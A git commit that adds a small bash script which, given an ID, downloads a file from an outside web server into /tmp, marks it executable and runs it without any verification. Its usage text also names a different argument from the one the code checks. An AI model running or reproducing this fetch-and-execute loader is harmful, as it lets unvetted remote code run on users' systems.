23d49cc4bd72a1d836b874a42aac704a439f7404
null <onerjjy@gmail.com>
2025-04-04 00:27:34 +0330

    Create file.sh

---
+++ file.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+
+SERVER="https://ayhan-dev.online//api.php"
+FILE_PATH="/tmp/t-5988-bvn55.sh"
+
+if [ "$1" == "tnp" ] && [ "$2" != "" ]; then
+    ID="$2"
+    echo "Downloading file with ID: $ID..."
+    
+    curl -s "$SERVER?id=$ID" -o "$FILE_PATH"
+    
+    if [ -s "$FILE_PATH" ]; then
+        chmod +x "$FILE_PATH"
+        echo "Executing file..."
+        bash "$FILE_PATH"
+    else
+        echo "Failed to download file."
+    fi
+else
+    echo "Usage: $0 kip <file_id>"
+fi
